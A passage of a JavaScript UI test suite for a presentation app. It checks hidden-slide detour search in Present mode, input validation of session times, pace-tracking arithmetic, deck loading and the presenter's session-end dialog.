  await _waitFor(() => { const s = _pdSel(); return s && s.itemId === s0.itemId && s.slideIdx === s0.slideIdx + 1; }, 1500)
    .catch(() => { throw new Error("the first module needs 2 or more slides"); });
  _hooks().injectBlocks([{ type: "heading", text: "PDBACKUP heading" }, { type: "text", text: "secret zqxdetour token", hidden: true }], { hidden: true });
  await _wait(150);
  document.activeElement?.blur?.();
  _key("ArrowLeft");
  await _waitFor(() => _pdSame(_pdSel(), s0), 1500);
  return past;
};
const _pdEnterPresent = async () => { document.activeElement?.blur?.(); _key("f"); await _waitFor(() => !_$("header"), 2000); await _wait(150); };
// Open the Present TOC, type the word, and jump to the detour row.
const _pdJump = async (checkEmpty) => {
  _key("e", { ctrlKey: true });
  await _waitFor(_hfeTocOpen, 2000);
  await _wait(150);
  if (checkEmpty && _$("[data-testid='toc-detour-section']")) throw new Error("hidden slides are listed with an empty search");
  _type(_$("input[placeholder^='Search slides']"), "zqxdetour");
  const row = await _waitFor(() => _$("[data-testid='toc-detour-row']"), 1500).catch(() => { throw new Error("search did not list the hidden slide"); });
  if (checkEmpty && !row.querySelector("[data-testid='toc-hidden-block']")) throw new Error("a hidden-block match has no HIDDEN BLOCK tag");
  _click(row);
  await _waitFor(() => _pdOnSlide("PDBACKUP"), 1500).catch(() => { throw new Error("the jump did not show the hidden slide"); });
  await _wait(400); // the hidden-slide auto-skip must not move off a detour
  if (!_pdOnSlide("PDBACKUP")) throw new Error("Present moved off the detour slide by itself");
  document.activeElement?.blur?.();
};
uiSuite("present-detour-search", [
  { name: "D1: hidden slide found only while typing; jump shows it with no number; Presenter view shows the detour; an arrow returns", fn: async () => {
    let past = null;
    try {
      past = await _pdPrepare();
      await _pdEnterPresent();
      const before = _pdSel();
      await _pdJump(true);
      if (_slideCounterEl()) throw new Error("the detour slide shows a slide number");
      _key("s");
      await _waitFor(() => _$("[data-testid='presenter-detour']"), 1500).catch(() => { throw new Error("Presenter view shows no detour cue"); });
      _key("s");
      await _waitFor(() => !_$("[data-testid='presenter-view']"), 1500);
      document.activeElement?.blur?.();
      _key("ArrowRight");
      await _waitFor(() => _pdSame(_pdSel(), before), 1500).catch(() => { throw new Error("ArrowRight did not return to the slide the detour left"); });
      if (_pdOnSlide("PDBACKUP")) throw new Error("the hidden slide is still on screen after the return");
      if (_$("header")) throw new Error("the return left Present");
    } finally { await _exitFullscreen(); if (past != null) await _mrdUndoTo(past); }
  }},
  { name: "D2: Esc on a detour returns to the slide that was left and keeps Present", fn: async () => {
    let past = null;
    try {
      past = await _pdPrepare();
      await _pdEnterPresent();
      const before = _pdSel();
      await _pdJump(false);
      _key("Escape");
      await _waitFor(() => _pdSame(_pdSel(), before), 1500).catch(() => { throw new Error("Esc did not return to the slide the detour left"); });
      await _wait(200);
      if (_$("header")) throw new Error("Esc on a detour left Present");
    } finally { await _exitFullscreen(); if (past != null) await _mrdUndoTo(past); }
  }},
], { setup: _selectFirstModule });

// ━━━ Session end (v13.80): sanitizer, pace math, deck ingress ━━━━━━━
const _SS_T0 = 1700000000000;
const _ssEq = (got, want, what) => { const g = JSON.stringify(got), w = JSON.stringify(want); if (g !== w) throw new Error(`${what}: got ${g}, want ${w}`); };
const _ssNoNaN = (o, what) => { for (const [k, v] of Object.entries(o || {})) if (typeof v === "number" && !Number.isFinite(v)) throw new Error(`${what}: ${k} = ${v}`); };
const _ssSeq = (durs) => durs.map((d, i) => ({ s: { duration: d }, num: i + 1, itemId: "m", rawIdx: i }));
const _ssSes = (lenSec) => ({ start: _SS_T0, end: _SS_T0 + lenSec * 1000 });

uiSuite("session-sanitizer", [
  { name: "SS1: valid sessions are accepted as fresh 2-key objects; extra keys are dropped", fn: async () => {
    _ssEq(sanitizeSession({ start: _SS_T0, end: _SS_T0 + 60000 }), { start: _SS_T0, end: _SS_T0 + 60000 }, "1 min");
    _ssEq(sanitizeSession({ start: _SS_T0, end: _SS_T0 + 86400000 }), { start: _SS_T0, end: _SS_T0 + 86400000 }, "24 h");
    const raw = { start: _SS_T0, end: _SS_T0 + 600000, x: 1, _private: true, style: "color:red" };
    const out = sanitizeSession(raw);
    _ssEq(Object.keys(out), ["start", "end"], "keys");
    if (out === raw) throw new Error("result is the raw object, not a fresh one");
    _ssEq(sanitizeSession({ start: SESSION_EPOCH_MIN, end: SESSION_EPOCH_MIN + 60000 }), { start: SESSION_EPOCH_MIN, end: SESSION_EPOCH_MIN + 60000 }, "epoch min");
    _ssEq(sanitizeSession({ start: SESSION_EPOCH_MAX - 60000, end: SESSION_EPOCH_MAX }), { start: SESSION_EPOCH_MAX - 60000, end: SESSION_EPOCH_MAX }, "epoch max");
  }},
  { name: "SS2: every malformed value is rejected (null, never coerced)", fn: async () => {
    const T = _SS_T0, E = T + 600000;
    const bad = [
      ["null", null], ["undefined", undefined], ["array", [T, E]], ["array with props", Object.assign([], { start: T, end: E })],
      ["string", "x"], ["number", 5], ["true", true], ["function", Object.assign(() => 0, { start: T, end: E })], ["{}", {}],
      ["missing end", { start: T }], ["missing start", { end: E }],
      ["numeric string start", { start: String(T), end: E }], ["numeric string end", { start: T, end: String(E) }],
      ["bool start", { start: true, end: E }], ["float start", { start: T + 0.5, end: E }], ["float end", { start: T, end: E + 0.5 }],
      ["NaN", { start: NaN, end: E }], ["Infinity end", { start: T, end: Infinity }], ["-Infinity start", { start: -Infinity, end: E }],
      ["1e300", { start: T, end: 1e300 }], ["negative", { start: -1, end: E }], ["unsafe integer", { start: T, end: 2 ** 53 }],
      ["Number object", { start: new Number(T), end: E }], ["null start", { start: null, end: E }],
      ["end == start", { start: T, end: T }], ["end < start", { start: E, end: T }],
      ["length 59999", { start: T, end: T + 59999 }], ["length 86400001", { start: T, end: T + 86400001 }],
      ["start before 2000", { start: SESSION_EPOCH_MIN - 1, end: SESSION_EPOCH_MIN + 60000 }],
      ["end after 2100", { start: SESSION_EPOCH_MAX - 60000, end: SESSION_EPOCH_MAX + 1 }],
      ["inherited start/end", Object.create({ start: T, end: E })],
      ["inherited end only", Object.assign(Object.create({ end: E }), { start: T })],
    ];
    for (const [label, v] of bad) { const r = sanitizeSession(v); if (r !== null) throw new Error(`${label} accepted: ${JSON.stringify(r)}`); }
  }},
  { name: "SS3: getters are read once; the checked value is the stored value", fn: async () => {
    let rs = 0, re = 0;
    const g = {};
    Object.defineProperty(g, "start", { enumerable: true, get: () => (++rs === 1 ? _SS_T0 : "x") });
    Object.defineProperty(g, "end", { enumerable: true, get: () => (++re === 1 ? _SS_T0 + 60000 : 1e300) });
    const out = sanitizeSession(g);
    if (rs !== 1 || re !== 1) throw new Error(`getter reads: start ${rs}, end ${re}`);
    _ssEq(out, { start: _SS_T0, end: _SS_T0 + 60000 }, "getter result");
    let n = 0;
    const h = {};
    Object.defineProperty(h, "start", { get: () => (++n === 1 ? "1700000000000" : _SS_T0) });
    Object.defineProperty(h, "end", { get: () => _SS_T0 + 60000 });
    if (sanitizeSession(h) !== null) throw new Error("getter that first returns a string was accepted");
  }},
  { name: "SS4: liveSession treats a session as not set from end + 3 h + 1 ms", fn: async () => {
    const s = _ssSes(600);
    if (!liveSession(s, s.start - 86400000)) throw new Error("future session not live");
    if (!liveSession(s, s.end + SESSION_STALE_MS)) throw new Error("end + 3 h not live");
    if (liveSession(s, s.end + SESSION_STALE_MS + 1) !== null) throw new Error("end + 3 h + 1 ms still live");
    if (liveSession({ start: "x", end: 1 }, s.start) !== null) throw new Error("invalid session live");
    if (liveSession(s, NaN) !== null) throw new Error("NaN now gave a live session");
  }},
  { name: "SS5: SET_SESSION re-sanitizes; invalid and unchanged values return the same state", fn: async () => {
    const st = { ...init, session: null };
    const valid = { start: _SS_T0, end: _SS_T0 + 600000, evil: 1 };
    const s1 = innerReducer(st, { type: "SET_SESSION", session: valid });
    _ssEq(s1.session, { start: _SS_T0, end: _SS_T0 + 600000 }, "set");
    if (innerReducer(s1, { type: "SET_SESSION", session: { start: "1", end: 2 } }) !== s1) throw new Error("invalid payload changed state");
    if (innerReducer(s1, { type: "SET_SESSION", session: { start: _SS_T0, end: _SS_T0 + 600000 } }) !== s1) throw new Error("unchanged payload changed state");
    if (innerReducer(st, { type: "SET_SESSION", session: null }) !== st) throw new Error("null on null changed state");
    const s2 = innerReducer(s1, { type: "SET_SESSION", session: null });
    if (s2.session !== null) throw new Error("null did not clear");
  }},
]);

uiSuite("session-pace-math", [
  { name: "SP1: verdict thresholds at delta 61 / 60 / -60 / -61 / -180 / -181", fn: async () => {
    // est [60,60,60,820] = need 1000 s at idx 0, onSlide 0; a 2000 s session keeps
    // every row inside the session (have = 1000 + delta > 0); now = end - have.
    const est = sessionEstimates(_ssSeq([60, 60, 60, 820]));
    const at = (delta) => { const ses = _ssSes(2000); const have = 1000 + delta; return computeSessionPace(est, 0, 0, ses, ses.end - have * 1000); };
    const rows = [[61, "green", "1:01 ahead · you can slow down"], [60, "white", "on pace"], [0, "white", "on pace"], [-60, "white", "on pace"],
      [-61, "amber", "1:01 behind · speed up"], [-180, "amber", "3:00 behind · speed up"], [-181, "red", "3:01 behind · speed up"]];
    for (const [d, key, text] of rows) {
      const p = at(d);
      if (p.delta !== d) throw new Error(`delta ${d}: got ${p.delta}`);
      if (p.paceKey !== key || p.verdict !== text) throw new Error(`delta ${d}: ${p.paceKey} "${p.verdict}"`);
      _ssNoNaN(p, `delta ${d}`);
    }
  }},
  { name: "SP2: before start, over, onSlideSec, fractions and shouldIdx", fn: async () => {
    const est = sessionEstimates(_ssSeq([60, 60, 60]));
    const ses = _ssSes(180);
    const b = computeSessionPace(est, 0, 0, ses, ses.start - 60000);
    if (!b.before || b.over || b.verdict !== "starts in 1:00" || b.timeLeftSec !== 180 || b.elapsedFrac !== 0 || b.delta !== 0) throw new Error(`before: ${JSON.stringify(b)}`);
    const o = computeSessionPace(est, 2, 0, ses, ses.end + 10000);
    if (!o.over || o.paceKey !== "red" || o.timeLeftKey !== "red" || o.verdict !== "+0:10 over · wrap up" || o.timeLeftSec !== 10 || o.elapsedFrac !== 1) throw new Error(`over: ${JSON.stringify(o)}`);
    const m = computeSessionPace(est, 1, 30, ses, ses.start + 90000);
    if (m.need !== 90 || m.have !== 90 || m.paceKey !== "white") throw new Error(`mid: ${JSON.stringify(m)}`);
    const f = computeSessionPace(est, 0, 500, ses, ses.start);
    if (f.need !== 120) throw new Error(`onSlideSec floor: need ${f.need}`);
    if (computeSessionPace(est, 0, -50, ses, ses.start).need !== 180) throw new Error("negative onSlideSec changed need");
    // shouldIdx: t = total - have; first k with cumulative est > t.
    const sAt = (sec) => computeSessionPace(est, 0, 0, ses, ses.start + sec * 1000).shouldIdx;
    _ssEq([sAt(0), sAt(59), sAt(60), sAt(119), sAt(120), sAt(180)], [0, 0, 1, 1, 2, 2], "shouldIdx");
    _ssEq(computeSessionPace(est, 0, 0, ses, ses.end + 999999).shouldIdx, 2, "shouldIdx over");
    const big = computeSessionPace(est, 0, 0, _ssSes(3600), _SS_T0);
    if (big.shouldFrac !== 0 || big.youFrac !== 0) throw new Error(`fracs clamp low: ${big.shouldFrac} ${big.youFrac}`);
    const late = computeSessionPace(est, 2, 0, ses, ses.end + 5000);
    if (late.shouldFrac !== 1 || !(late.youFrac >= 0 && late.youFrac <= 1)) throw new Error(`fracs clamp high: ${late.shouldFrac} ${late.youFrac}`);
    if (computeSessionPace(est, 0, 0, { start: "x", end: 1 }, _SS_T0) !== null) throw new Error("invalid session gave a pace");
  }},
  { name: "SP3: timeLeftKey: white, amber at 75 % elapsed, red at 5 min left", fn: async () => {
    const est = sessionEstimates(_ssSeq([60]));
    const ses = _ssSes(3600);
    _ssEq(computeSessionPace(est, 0, 0, ses, ses.start + 60000).timeLeftKey, "white", "early");
    _ssEq(computeSessionPace(est, 0, 0, ses, ses.start + 2700000).timeLeftKey, "amber", "75 %");
    _ssEq(computeSessionPace(est, 0, 0, ses, ses.end - 300000).timeLeftKey, "red", "5 min left");
    _ssEq(computeSessionPace(est, 0, 0, ses, ses.start - 1).timeLeftKey, "white", "before start");
  }},
  { name: "SP4: estimates: deck average for missing durations, fallback 60 s, bad durations count as missing", fn: async () => {
    const a = sessionEstimates(_ssSeq([30, undefined, 90, "60", NaN, -5, Infinity, 0]));
    _ssEq(a, { est: [30, 60, 90, 60, 60, 60, 60, 60], total: 480, estimated: 6 }, "average rule");
    _ssEq(sessionEstimates(_ssSeq([undefined, null])), { est: [60, 60], total: 120, estimated: 2 }, "fallback 60");
    _ssEq(sessionEstimates(_ssSeq([999999])), { est: [86400], total: 86400, estimated: 0 }, "cap");
    _ssEq(sessionEstimates([]), { est: [], total: 0, estimated: 0 }, "empty");
    _ssEq(sessionEstimates(null), { est: [], total: 0, estimated: 0 }, "null");
    _ssEq(sessionEstimates([null, { s: null }]), { est: [60, 60], total: 120, estimated: 2 }, "broken entries");
  }},
  { name: "SP5: presentSequence numbering, hidden slides and the collapsed lane rule; sessionSeqIndex", fn: async () => {
    const lanes = [
      { title: "A", items: [{ id: "a1", slides: [{ duration: 10 }, { hidden: true }, { duration: 20 }] }] },
      { title: "B", collapsed: true, items: [{ id: "b1", slides: [{}, {}] }, { id: "b2", slides: [{}] }] },
      { title: "C", items: [{ id: "c1", slides: [{ hidden: true }] }, { id: "c2", slides: [{}] }] },
    ];
    const seq = presentSequence(lanes, "a1");
    _ssEq(seq.map((e) => [e.num, e.itemId, e.rawIdx]), [[1, "a1", 0], [2, "a1", 2], [6, "c2", 0]], "collapsed lane skipped");
    if (seq[0].s !== lanes[0].items[0].slides[0]) throw new Error("entry.s is not the slide");
    const keep = presentSequence(lanes, "b2");
    _ssEq(keep.map((e) => [e.num, e.itemId, e.rawIdx]), [[1, "a1", 0], [2, "a1", 2], [3, "b1", 0], [4, "b1", 1], [5, "b2", 0], [6, "c2", 0]], "lane of keepItemId kept");
    _ssEq(sessionEstimates(seq).est, [10, 20, 15], "estimates read entry.s.duration");
    _ssEq([sessionSeqIndex(seq, "a1", 0), sessionSeqIndex(seq, "a1", 1), sessionSeqIndex(seq, "a1", 2), sessionSeqIndex(seq, "a1", 9)], [0, 0, 1, 1], "largest rawIdx <= given");
    _ssEq(sessionSeqIndex(seq, "a1", -1), 0, "title card -> first entry of item");
    _ssEq(sessionSeqIndex(seq, "c2", -1), 2, "title card of later item");
    _ssEq(sessionSeqIndex(seq, "c1", 0), 2, "item with no entry -> entries before it");
    _ssEq(sessionSeqIndex(seq, "b1", 0), 2, "collapsed item -> entries before it");
    _ssEq(sessionSeqIndex(seq, "zz", 0), 0, "unknown item");
    _ssEq(sessionSeqIndex(seq, "a1", NaN), 0, "NaN rawIdx");
    _ssEq(sessionSeqIndex([], "a1", 0), 0, "empty seq");
    _ssEq(sessionSeqIndex(null, "a1", 0), 0, "null seq");
    const tail = presentSequence([{ items: [{ id: "x", slides: [{}] }, { id: "y", slides: [{ hidden: true }] }] }], null);
    _ssEq(sessionSeqIndex(tail, "y", 0), 0, "trailing item with no entry clamps to last index");
    _ssEq(presentSequence(null, null).length, 0, "null lanes");
    _ssEq(presentSequence([null, { items: null }, { items: [null, { id: "q", slides: [null, {}] }] }], null).map((e) => [e.num, e.rawIdx]), [[1, 1]], "broken lanes");
  }},
  { name: "SP6: no NaN / Infinity in any field for edge inputs", fn: async () => {
    const e3 = sessionEstimates(_ssSeq([60, 60, 60]));
    const ses = _ssSes(600);
    const rows = [
      ["empty seq", { est: [], total: 0 }, 0, 0, ses.start + 1000],
      ["total 0", { est: [0, 0], total: 0 }, 1, 0, ses.start + 1000],
      ["wrong total", { est: [60], total: NaN }, 0, 0, ses.start],
      ["est junk", { est: [NaN, Infinity, -5, "9", 1e308] }, 0, 0, ses.start],
      ["no estimates object", null, 0, 0, ses.start],
      ["huge onSlideSec", e3, 0, 1e308, ses.start + 1000],
      ["Infinity onSlideSec", e3, 0, Infinity, ses.start + 1000],
      ["NaN onSlideSec", e3, 0, NaN, ses.start + 1000],
      ["NaN idx", e3, NaN, 0, ses.start],
      ["huge idx", e3, 1e20, 0, ses.start],
      ["negative idx", e3, -7, 0, ses.start],
      ["now far before", e3, 0, 0, -8.64e15],
      ["now far after", e3, 0, 0, 8.64e15],
      ["now 1e308", e3, 0, 0, 1e308],
      ["now NaN", e3, 0, 0, NaN],
      ["now Infinity", e3, 0, 0, Infinity],
    ];
    for (const [label, est, idx, on, now] of rows) {
      const p = computeSessionPace(est, idx, on, ses, now);
      if (!p) throw new Error(`${label}: null`);
      _ssNoNaN(p, label);
      if (!(p.shouldIdx >= 0 && p.shouldIdx <= Math.max(0, (est?.est?.length || 0) - 1))) throw new Error(`${label}: shouldIdx ${p.shouldIdx}`);
      for (const k of ["shouldFrac", "youFrac", "elapsedFrac"]) if (!(p[k] >= 0 && p[k] <= 1)) throw new Error(`${label}: ${k} ${p[k]}`);
      if (!SESSION_PACE_COLORS[p.paceKey] || !SESSION_PACE_COLORS[p.timeLeftKey]) throw new Error(`${label}: colour key`);
      if (/NaN|Infinity|undefined/.test(p.verdict)) throw new Error(`${label}: verdict "${p.verdict}"`);
    }
  }},
  { name: "SP7: fmtCountdown, fmtClock, resolveSessionTimes", fn: async () => {
    _ssEq([fmtCountdown(0), fmtCountdown(59.9), fmtCountdown(61), fmtCountdown(3600), fmtCountdown(-5), fmtCountdown(NaN), fmtCountdown(Infinity), fmtCountdown("9")], ["0:00", "0:59", "1:01", "1:00:00", "0:00", "0:00", "0:00", "0:00"], "fmtCountdown");
    if (!/^\d\d:\d\d$/.test(fmtClock(Date.now()))) throw new Error(`fmtClock: ${fmtClock(Date.now())}`);
    _ssEq([fmtClock(NaN), fmtClock(8.64e15 + 1), fmtClock("x")], ["--:--", "--:--", "--:--"], "fmtClock invalid");
    const now = new Date(2026, 5, 10, 8, 0).getTime();
    const len = (r) => (r ? (r.end - r.start) / 60000 : null);
    _ssEq(len(resolveSessionTimes("09:00", "10:00", now)), 60, "1 h");
    _ssEq(len(resolveSessionTimes("23:30", "00:15", now)), 45, "next day");
    _ssEq(len(resolveSessionTimes("09:00", "09:00", now)), 1440, "equal -> 24 h");
    _ssEq(resolveSessionTimes("09:00", "10:00", now).start, new Date(2026, 5, 10, 9, 0).getTime(), "start on today");
    for (const [a, b] of [["24:00", "10:00"], ["9:00", "10:00"], ["", "10:00"], ["09:00", null], [900, "10:00"], ["09:00 ", "10:00"]]) {
      if (resolveSessionTimes(a, b, now) !== null) throw new Error(`accepted ${JSON.stringify([a, b])}`);
    }
    if (resolveSessionTimes("09:00", "10:00", NaN) !== null) throw new Error("NaN now accepted");
  }},
]);

uiSuite("session-ingress", [
  { name: "SI1: validateAndSanitizeDeck always returns a session key (value or null)", fn: async () => {
    const lanes = () => [{ title: "L", items: [{ title: "I", slides: [{ blocks: [] }] }] }];
    const none = validateAndSanitizeDeck({ lanes: lanes() });
    if (!Object.prototype.hasOwnProperty.call(none, "session") || none.session !== null) throw new Error("deck without session: key missing or not null");
    const ok = validateAndSanitizeDeck({ lanes: lanes(), session: { start: _SS_T0, end: _SS_T0 + 600000, x: 1 } });
    _ssEq(ok.session, { start: _SS_T0, end: _SS_T0 + 600000 }, "valid session");
    const bad = validateAndSanitizeDeck({ lanes: lanes(), session: { start: "1700000000000", end: _SS_T0 + 600000 } });
    if (bad.session !== null) throw new Error("hostile session kept");
  }},
  { name: "SI2: storage-reload shape: hostile session is dropped; a deck without the key keeps its shape", fn: async () => {
    const d1 = { lanes: [], session: { start: _SS_T0, end: "x" } };
    resanitizeLoadedSession(d1);
    if (d1.session !== null) throw new Error("hostile stored session kept");
    const d2 = { lanes: [], session: { start: _SS_T0, end: _SS_T0 + 60000, __proto__x: 1 } };
    resanitizeLoadedSession(d2);
    _ssEq(d2.session, { start: _SS_T0, end: _SS_T0 + 60000 }, "valid stored session");
    const d3 = { lanes: [] };
    resanitizeLoadedSession(d3);
    if ("session" in d3) throw new Error("key added to a deck without one");
    for (const v of [null, undefined, "x", 5]) resanitizeLoadedSession(v);
  }},
  { name: "SI3: file/export payload carries session only when set", fn: async () => {
    const base = { deckTitle: "D", lanes: [], branding: {}, guidelines: "" };
    const p0 = localDeckPayload({ ...base, session: null, chatMessages: [] });
    _ssEq(Object.keys(p0), ["deckTitle", "lanes", "branding", "guidelines"], "no session");
    const p1 = localDeckPayload({ ...base, session: { start: _SS_T0, end: _SS_T0 + 60000 } });
    _ssEq(p1.session, { start: _SS_T0, end: _SS_T0 + 60000 }, "session set");
    _ssEq(Object.keys(extractSave({ ...init, session: { start: _SS_T0, end: _SS_T0 + 60000 } })).includes("session"), true, "extractSave keeps session");
  }},
  { name: "SI4: LOAD of a deck without session clears the session of the previous deck (live state)", fn: async () => {
    const hooks = _hooks();
    if (!hooks.setSessionForTest || !hooks.getSessionForTest || !hooks.restoreStartupDeck) throw new Error("session test hooks missing");
    try {
      hooks.setSessionForTest({ start: _SS_T0, end: _SS_T0 + 600000 });
      await _waitFor(() => hooks.getSessionForTest() !== null, 1500).catch(() => { throw new Error("SET_SESSION did not reach state"); });
      _ssEq(hooks.getDeckStateForTest().session, { start: _SS_T0, end: _SS_T0 + 600000 }, "getDeckStateForTest");
      hooks.setSessionForTest({ start: _SS_T0, end: _SS_T0 });
      await _wait(80);
      _ssEq(hooks.getSessionForTest(), { start: _SS_T0, end: _SS_T0 + 600000 }, "invalid SET_SESSION changed state");
      if (!hooks.restoreStartupDeck()) throw new Error("startup deck fixture missing");
      await _waitFor(() => hooks.getSessionForTest() === null, 1500).catch(() => { throw new Error("LOAD kept the session of the previous deck"); });
    } finally { hooks.setSessionForTest?.(null); }
  }},
]);

// ── Session end: Present-side UI (v13.80, P2) ─────────────────────────
// Present root = the fixed inset:0 zIndex 9999 element. Each test restores:
// session null, dialog closed, presenter view closed, Present left.
const _sesUiRoot = () => _$$("div").find((d) => d.style.position === "fixed" && d.style.inset === "0px" && d.style.zIndex === "9999");
const _sesUiPresent = async () => {
  await _editorSetup();
  document.activeElement?.blur(); await _wait(100);
  _key("f");
  await _waitFor(() => !_$("header") && _sesUiRoot(), 2000);
};
const _sesUiLeave = async () => {
  const hooks = _hooks();
  if (_$("[data-testid='session-cancel']")) { _click("[data-testid='session-cancel']"); await _waitFor(() => !_$("[data-testid='session-dialog']"), 1500).catch(() => {}); }
  if (_$("[data-testid='presenter-view']")) { _click("[data-testid='presenter-toggle']"); await _waitFor(() => !_$("[data-testid='presenter-view']"), 1500).catch(() => {}); }
  // T again while Present is open: resets the mounted SlidePanel state, not
  // only the module flag (SlidePanel is not remounted on Present exit).
  if (VELA_SESSION_BAR.hidden && _sesUiRoot()) { document.activeElement?.blur(); await _wait(50); _key("t"); await _waitFor(() => !VELA_SESSION_BAR.hidden, 1000).catch(() => {}); }
  hooks.setSessionForTest?.(null);
  VELA_SESSION_BAR.hidden = false;
  await _exitFullscreen();
};
const _sesUiSet = (el, value) => {
  Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value").set.call(el, String(value));
  el.dispatchEvent(new Event("input", { bubbles: true }));
};
const _sesUiOpenPresenter = async () => {
  document.activeElement?.blur(); await _wait(80);
  _key("s");
  await _waitFor(() => _$("[data-testid='presenter-session-panel']"), 2000);
};
const _sesUiNeedHooks = () => {
  const hooks = _hooks();
  if (!hooks.setSessionForTest || !hooks.getSessionForTest) throw new Error("session test hooks missing");
  return hooks;
};

uiSuite("session-presenter-panel", [
  { name: "SP1: no session -> clock and Set session end button; dialog opens INSIDE the Present root", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest(null);
      await _sesUiPresent();
      await _sesUiOpenPresenter();
      const clock = _$("[data-testid='presenter-clock']");
      if (!clock || !/^\d\d:\d\d$/.test(clock.textContent.trim())) throw new Error("presenter-clock missing or not HH:MM: " + clock?.textContent);
      if (_$("[data-testid='presenter-time-left']")) throw new Error("time left shown without a session");
      const btn = _$("[data-testid='presenter-session-set']");
      if (!btn || btn.tagName !== "BUTTON") throw new Error("presenter-session-set is not a button");
      _click(btn);
      const dlg = await _waitFor(() => _$("[data-testid='session-dialog']"), 1500);
      if (!_sesUiRoot()?.contains(dlg)) throw new Error("session dialog is not inside the Present root");
      await _waitFor(() => document.activeElement === _$("[data-testid='session-end-input']"), 1000).catch(() => { throw new Error("focus is not on the End input"); });
      if (_$("[data-testid='session-clear']")) throw new Error("Clear shown without a stored session");
      if (!_$("[data-testid='session-set']").disabled) throw new Error("Set enabled with an empty End");
    } finally { await _sesUiLeave(); }
  }},
  { name: "SP2: chip 30 sets End = Start + 30; Set stores 30 min; panel shows every pace element", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest(null);
      await _sesUiPresent();
      await _sesUiOpenPresenter();
      _click("[data-testid='presenter-session-set']");
      await _waitFor(() => _$("[data-testid='session-dialog']"), 1500);
      _click("[data-testid='session-chip-30']");
      await _wait(80);
      const st = _$("[data-testid='session-start-input']").value, en = _$("[data-testid='session-end-input']").value;
      const t = Date.now();
      const r = resolveSessionTimes(st, en, t, t);
      if (!r || r.end - r.start !== 1800000) throw new Error(`chip 30 gave ${st} -> ${en}`);
      if (_$("[data-testid='session-minutes-input']").value !== "30") throw new Error("minutes field not 30");
      _click("[data-testid='session-set']");
      await _waitFor(() => !_$("[data-testid='session-dialog']"), 1500);
      const s = hooks.getSessionForTest();
      if (!s || s.end - s.start !== 1800000) throw new Error("stored session is not 30 min: " + JSON.stringify(s));
      if (!_$("[data-testid='presenter-view']")) throw new Error("Set closed the presenter view");
      for (const id of ["presenter-clock", "presenter-time-left", "presenter-time-bar", "presenter-pace", "presenter-pace-track", "presenter-pace-you", "presenter-pace-should"]) {
        await _waitFor(() => _$(`[data-testid='${id}']`), 1500).catch(() => { throw new Error(`${id} missing with a session`); });
      }
      if (_$("[data-testid='presenter-session-set']")) throw new Error("Set button still shown with a session");
    } finally { await _sesUiLeave(); }
  }},
  { name: "SP3: verdict matches computeSessionPace (over and not-yet-started); colour follows the verdict", fn: async () => {
    const hooks = _sesUiNeedHooks();
    const cands = (ses) => [0, 1000, 2000].map((d) => computeSessionPace({ est: [60] }, 0, 0, ses, Date.now() - d).verdict);
    try {
      await _sesUiPresent();
      await _sesUiOpenPresenter();
      const over = { start: Date.now() - 40 * 60000, end: Date.now() - 10 * 60000 };
      hooks.setSessionForTest(over);
      const tl = await _waitFor(() => _$("[data-testid='presenter-time-left']"), 2000);
      await _wait(50);
      const v1 = _$("[data-testid='presenter-pace']").textContent;
      if (!cands(over).includes(v1)) throw new Error(`over verdict "${v1}" not in ${JSON.stringify(cands(over))}`);
      if (!tl.textContent.startsWith("+")) throw new Error("time left does not count up when over: " + tl.textContent);
      const before = { start: Date.now() + 5 * 60000, end: Date.now() + 35 * 60000 };
      hooks.setSessionForTest(before);
      await _waitFor(() => /^starts in /.test(_$("[data-testid='presenter-pace']")?.textContent || ""), 2000);
      const v2 = _$("[data-testid='presenter-pace']").textContent;
      if (!cands(before).includes(v2)) throw new Error(`before verdict "${v2}" not in ${JSON.stringify(cands(before))}`);
      const live = { start: Date.now() - 47 * 60000, end: Date.now() + 28 * 60000 };
      hooks.setSessionForTest(live);
      await _waitFor(() => !/^starts in /.test(_$("[data-testid='presenter-pace']")?.textContent || ""), 2000);
      const pv = _$("[data-testid='presenter-pace']");
      const t = pv.textContent;
      const key = /ahead/.test(t) ? "green" : t === "on pace" ? "white" : /behind/.test(t) ? null : "x";
      if (key === "x") throw new Error("unexpected live verdict: " + t);
      const rgb = (hex) => `rgb(${parseInt(hex.slice(1, 3), 16)}, ${parseInt(hex.slice(3, 5), 16)}, ${parseInt(hex.slice(5, 7), 16)})`;
      const ok = key ? [rgb(SESSION_PACE_COLORS[key])] : [rgb(SESSION_PACE_COLORS.amber), rgb(SESSION_PACE_COLORS.red)];
      if (!ok.includes(getComputedStyle(pv).color)) throw new Error(`verdict colour ${getComputedStyle(pv).color} does not match "${t}"`);
      if (!_$("[data-testid='presenter-pace-you']") || !_$("[data-testid='presenter-pace-should']")) throw new Error("pace ticks missing");
      if (!/YOU · slide \d+/.test(_$("[data-testid='presenter-session-panel']").textContent) || !/SHOULD BE · slide \d+/.test(_$("[data-testid='presenter-session-panel']").textContent)) throw new Error("YOU / SHOULD BE labels missing");
    } finally { await _sesUiLeave(); }
  }},
  { name: "SP4: keys in the dialog do not reach Present; Escape closes only the dialog", fn: async () => {
    const hooks = _sesUiNeedHooks();
    try {
      hooks.setSessionForTest(null);
      await _sesUiPresent();
      _key("ArrowRight"); await _wait(300);
      await _sesUiOpenPresenter();
      _click("[data-testid='presenter-session-set']");
      await _waitFor(() => _$("[data-testid='session-dialog']"), 1500);
      const pos = _slidePos();
      const chip = _$("[data-testid='session-chip-15']");
      chip.focus();
      for (const k of ["ArrowRight", "ArrowLeft", " ", "s", "t", "g", "e", "n"]) { _key(k); await _wait(60); }
      if (!_$("[data-testid='session-dialog']")) throw new Error("a key typed on a dialog button closed the dialog");
      if (!_$("[data-testid='presenter-view']")) throw new Error("a key typed in the dialog closed the presenter view");
      if (_slidePos() !== pos) throw new Error(`slide moved while the dialog was open: ${pos} -> ${_slidePos()}`);
      // Focus outside the dialog (Present root): the capture trap still holds keys.
      _sesUiRoot().focus();
      _key("ArrowRight"); await _wait(200);
      if (_slidePos() !== pos) throw new Error("ArrowRight with focus outside the dialog moved the slide");
      _$("[data-testid='session-end-input']").focus();
      _key("Escape");
      await _waitFor(() => !_$("[data-testid='session-dialog']"), 1500);
      await _wait(150);
      if (!_$("[data-testid='presenter-view']")) throw new Error("Escape in the dialog closed the presenter view");
      if (_$("header")) throw new Error("Escape in the dialog left Present");
      if (hooks.getSessionForTest() !== null) throw new Error("Escape changed the session");
    } finally { await _sesUiLeave(); }
  }},
